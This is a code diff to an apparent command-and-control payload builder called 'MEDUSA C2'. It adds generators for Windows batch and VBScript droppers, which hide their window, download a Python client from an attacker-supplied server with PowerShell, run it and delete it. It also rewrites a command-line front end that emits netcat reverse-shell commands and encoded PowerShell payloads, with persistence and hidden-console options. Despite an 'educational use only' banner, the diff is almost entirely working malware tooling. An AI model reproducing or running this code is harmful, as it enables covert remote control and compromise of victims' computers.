@@ -30,6 +30,63 @@ class PayloadBuilder:
         os.makedirs(self.output_dir, exist_ok=True)
         os.makedirs(self.templates_dir, exist_ok=True)
     
+    def generate_batch_dropper(self, server_ip, server_port, output_name="dropper.bat"):
+        """Generate a Windows batch file dropper"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_path = os.path.join(self.output_dir, output_name)
+        
+        batch_content = f'''@echo off
+REM MEDUSA C2 Batch Dropper
+REM Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+REM Server: {server_ip}:{server_port}
+
+REM Hide console window
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+
+REM Download and execute Python client
+powershell -Command "Invoke-WebRequest -Uri 'http://{server_ip}:8000/client.py' -OutFile 'client.py'"
+python client.py
+
+REM Cleanup
+del /f client.py
+'''
+        
+        with open(output_path, 'w') as f:
+            f.write(batch_content)
+        
+        return output_path
+    
+    def generate_vbs_dropper(self, server_ip, server_port, output_name="dropper.vbs"):
+        """Generate a VBScript dropper"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_path = os.path.join(self.output_dir, output_name)
+        
+        vbs_content = f'''\' MEDUSA C2 VBS Dropper
+\' Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+\' Server: {server_ip}:{server_port}
+
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+\' Download and execute Python client
+strPythonPath = objShell.ExpandEnvironmentStrings("%SYSTEMROOT%\\py.exe")
+If objFSO.FileExists(strPythonPath) Then
+    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'http://{server_ip}:8000/client.py' -OutFile 'client.py'""", 0, True
+    objShell.Run "python client.py", 0, False
+    objFSO.DeleteFile "client.py"
+Else
+    \' Fallback to python command
+    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'http://{server_ip}:8000/client.py' -OutFile 'client.py'""", 0, True
+    objShell.Run "python client.py", 0, False
+    objFSO.DeleteFile "client.py"
+End If
+'''
+        
+        with open(output_path, 'w') as f:
+            f.write(vbs_content)
+        
+        return output_path
+    
     def generate_python_client(self, server_ip, server_port, output_name="client", hide_console=False, persistence=False):
         """Generate Python client code"""
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -627,104 +684,119 @@ elif platform.system() == "Linux":
             pass  # Silently continue if hiding fails'''
 
 def main():
-    """Main builder function"""
+    """Main function for command line usage"""
     parser = argparse.ArgumentParser(description='MEDUSA C2 Payload Builder')
     parser.add_argument('--type', choices=['python', 'netcat', 'powershell', 'batch', 'vbs'], 
-                       required=True, help='Payload type to generate')
+                        required=True, help='Payload type')
     parser.add_argument('--ip', required=True, help='Server IP address')
     parser.add_argument('--port', type=int, required=True, help='Server port')
     parser.add_argument('--output', default='client', help='Output filename (without extension)')
     parser.add_argument('--build-exe', action='store_true', help='Build executable with PyInstaller')
-    parser.add_argument('--hide-console', action='store_true', help='Hide console window')
+    parser.add_argument('--hide-console', action='store_true', help='Hide console window (Windows EXE)')
     parser.add_argument('--persistence', action='store_true', help='Add persistence mechanisms')
-    parser.add_argument('--encode', action='store_true', help='Base64 encode PowerShell payload')
-    parser.add_argument('--icon', help='Icon file for executable')
+    parser.add_argument('--encode', action='store_true', help='Base64 encode payload (PowerShell)')
+    parser.add_argument('--icon', help='Icon file for executable (EXE only)')
+    parser.add_argument('--test', action='store_true', help='Test all builder functions')
     
     args = parser.parse_args()
     
+    if args.test:
+        test_builder()
+        return
+    
     builder = PayloadBuilder()
     
-    print(f"""
-╔══════════════════════════════════════════════════════════════╗
-║                     MEDUSA C2 BUILDER                       ║
-║                  Professional Payload Generator              ║
-║                     Educational Use Only                     ║
-╚══════════════════════════════════════════════════════════════╝
-
-🎯 Target: {args.ip}:{args.port}
-🔧 Type: {args.type.upper()}
-📁 Output: {args.output}
-""")
-    
-    output_files = []
-    
-    if args.type == 'python':
-        py_file = builder.generate_python_client(
-            args.ip, args.port, args.output, 
-            hide_console=args.hide_console, 
-            persistence=args.persistence
-        )
-        output_files.append(py_file)
-        print(f"✅ Python client generated: {py_file}")
-        
-        if args.build_exe:
-            stealth_level = "stealth" if args.hide_console else "basic"
-            exe_file = builder.build_executable(
-                py_file, args.output, 
-                hide_console=args.hide_console,
-                stealth_level=stealth_level,
-                icon_path=args.icon
+    try:
+        if args.type == 'python':
+            print("Generating Python client...")
+            py_file = builder.generate_python_client(
+                args.ip, args.port, args.output, args.hide_console, args.persistence
             )
-            if exe_file:
-                output_files.append(exe_file)
-    
-    elif args.type == 'netcat':
-        payloads = builder.generate_netcat_payload(args.ip, args.port)
-        print("\n🐚 Netcat Reverse Shell Commands:")
-        print("\n📁 Windows:")
-        for cmd in payloads['windows']:
-            print(f"   {cmd}")
-        print("\n🐧 Linux:")
-        for cmd in payloads['linux']:
-            print(f"   {cmd}")
-        print("\n👂 Listener Commands:")
-        for cmd in payloads['listener']:
-            print(f"   {cmd}")
-    
-    elif args.type == 'powershell':
-        payloads = builder.generate_powershell_payload(args.ip, args.port, encode_base64=args.encode)
+            print(f"Python client generated: {py_file}")
+            
+            if args.build_exe:
+                print("Building executable...")
+                exe_file = builder.build_executable(
+                    py_file, args.output, args.hide_console, 'silent' if args.hide_console else 'basic'
+                )
+                if exe_file:
+                    print(f"Executable built: {exe_file}")
+                else:
+                    print("Failed to build executable")
         
-        # Save script file
-        ps1_file = os.path.join(builder.output_dir, f"{args.output}.ps1")
-        with open(ps1_file, 'w') as f:
-            f.write(payloads['script'])
-        output_files.append(ps1_file)
+        elif args.type == 'netcat':
+            print("Generating Netcat payload...")
+            payloads = builder.generate_netcat_payload(args.ip, args.port)
+            print("Netcat commands:")
+            print("Windows:")
+            for cmd in payloads['windows']:
+                print(f"  {cmd}")
+            print("Linux/Mac:")
+            for cmd in payloads['linux']:
+                print(f"  {cmd}")
+            print("Listener:")
+            for cmd in payloads['listener']:
+                print(f"  {cmd}")
         
-        print(f"\n✅ PowerShell script saved: {ps1_file}")
-        print(f"\n💻 One-liner command:")
-        print(f"   {payloads['oneliner']}")
+        elif args.type == 'powershell':
+            print("Generating PowerShell payload...")
+            payloads = builder.generate_powershell_payload(args.ip, args.port)
+            if args.encode:
+                print(f"Encoded payload: {payloads['encoded']}")
+            else:
+                print(f"Full script: {payloads['script']}")
+                print(f"One-liner: {payloads['oneliner']}")
         
-        if args.encode:
-            print(f"\n🔒 Encoded command:")
-            print(f"   {payloads['encoded']}")
+        elif args.type == 'batch':
+            print("Generating Batch dropper...")
+            batch_file = builder.generate_batch_dropper(args.ip, args.port, f"{args.output}.bat")
+            print(f"Batch dropper generated: {batch_file}")
+        
+        elif args.type == 'vbs':
+            print("Generating VBS dropper...")
+            vbs_file = builder.generate_vbs_dropper(args.ip, args.port, f"{args.output}.vbs")
+            print(f"VBS dropper generated: {vbs_file}")
     
-    elif args.type == 'batch':
-        bat_file = builder.generate_batch_dropper(args.ip, args.port, args.output)
-        output_files.append(bat_file)
-        print(f"✅ Batch dropper generated: {bat_file}")
+    except Exception as e:
+        print(f"Error: {e}")
+        sys.exit(1)
+
+def test_builder():
+    """Test all builder functions"""
+    print("Testing MEDUSA C2 Payload Builder...")
+    builder = PayloadBuilder()
     
-    elif args.type == 'vbs':
-        vbs_file = builder.generate_vbs_dropper(args.ip, args.port, args.output)
-        output_files.append(vbs_file)
-        print(f"✅ VBS dropper generated: {vbs_file}")
-    
-    # Save payload information
-    config = vars(args)
-    info_file = builder.save_payload_info(args.type, config, output_files)
-    
-    print(f"\n📋 Payload info saved: {info_file}")
-    print(f"\n🎯 Total files generated: {len(output_files)}")
-    print("\n⚠️  REMEMBER: This tool is for educational purposes only!")
+    try:
+        # Test Python client generation
+        print("1. Testing Python client generation...")
+        py_file = builder.generate_python_client("127.0.0.1", 4444, "test_client")
+        print(f"   ✓ Python client: {py_file}")
+        
+        # Test Netcat payload generation
+        print("2. Testing Netcat payload generation...")
+        nc_payloads = builder.generate_netcat_payload("127.0.0.1", 4444)
+        print(f"   ✓ Netcat payloads generated")
+        
+        # Test PowerShell payload generation
+        print("3. Testing PowerShell payload generation...")
+        ps_payloads = builder.generate_powershell_payload("127.0.0.1", 4444)
+        print(f"   ✓ PowerShell payloads generated")
+        
+        # Test Batch dropper generation
+        print("4. Testing Batch dropper generation...")
+        batch_file = builder.generate_batch_dropper("127.0.0.1", 4444, "test_dropper.bat")
+        print(f"   ✓ Batch dropper: {batch_file}")
+        
+        # Test VBS dropper generation
+        print("5. Testing VBS dropper generation...")
+        vbs_file = builder.generate_vbs_dropper("127.0.0.1", 4444, "test_dropper.vbs")
+        print(f"   ✓ VBS dropper: {vbs_file}")
+        
+        print("\n✓ All tests passed!")
+        
+    except Exception as e:
+        print(f"✗ Test failed: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
